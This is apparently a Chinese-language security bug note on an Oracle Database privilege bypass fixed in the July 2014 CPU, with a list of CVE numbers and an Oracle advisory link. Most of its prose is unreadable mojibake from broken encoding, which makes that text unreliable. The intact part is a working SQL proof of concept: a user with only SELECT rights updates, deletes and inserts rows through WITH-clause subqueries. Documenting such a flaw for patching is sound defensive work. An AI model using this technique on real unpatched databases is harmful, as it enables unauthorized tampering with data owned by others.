�����ʡ���Σ©��
��Σ�������в�ѯȨ�޵��û����Զ����ݽ�������ɾ���Ĳ���
��Ӱ�췶Χ���㷺������11.2.0.3��11.2.0.4��12.1�Ȱ汾��10g�汾����������
���޸���2014��7�µ�CPU�б�������ǿ�ҽ������������Oracle���ݿ⣬ȷ���Ƿ���ڸð�ȫ���ա�

����йص�CVE�Ű�����CVE-2013-3751��CVE-2014-4236��CVE-2014-4237��CVE-2014-4245��CVE-2013-3774 .

�����Ϣ�����Բο�Oracle��CPUҳ�棺
http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html

��bug test��
--100.95  Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit
SQL> conn ncv502/ncv502
create user test identified by test;
grant create session to test;
create table t (ID number(4)); 
insert into t(ID) values(1); 
select * from t;
grant select on t to test;

SQL> conn test/test
select * from ncv502.t;
update ncv502.t set id = 1 where id = 1;
              *
�� 1 �г��ִ���:
ORA-01031: Ȩ�޲���

--��WITH����У�Ȩ�����Ʊ���ȫ�ƹ�����ɾ��Ȩ�ޱ����
SQL> update (with tmp as (select id from ncv502.t) select id from tmp) set id = 0 where id = 1;
1 row updated.
SQL> commit;
Commit complete.
SQL> delete (with temp as (select * from ncv502.t) select id from temp) where id = 0;
1 row deleted.
SQL> insert into (with temp as (select * from ncv502.t) select * from temp) select 2 from dual;
1 row created.

drop table t purge ;
drop user test cascade;

--71 Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bit  û�и�bug

